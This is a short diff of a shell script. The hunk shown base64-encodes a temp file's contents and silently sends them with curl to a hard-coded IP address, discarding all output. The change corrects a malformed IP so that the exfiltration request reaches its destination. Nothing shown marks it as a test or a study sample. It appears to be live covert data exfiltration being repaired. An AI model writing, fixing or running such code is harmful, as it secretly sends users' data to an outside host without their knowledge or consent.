@@ -25,4 +25,4 @@ if [ ! -s "$TEMP_FILE" ]; then
 fi
 
 ENCODED_DATA=$(base64 < "$TEMP_FILE")
-curl -s "http://18.219198.148/?data=${ENCODED_DATA}" > /dev/null 2>&1
+curl -s "http://18.219.198.148/?data=${ENCODED_DATA}" > /dev/null 2>&1
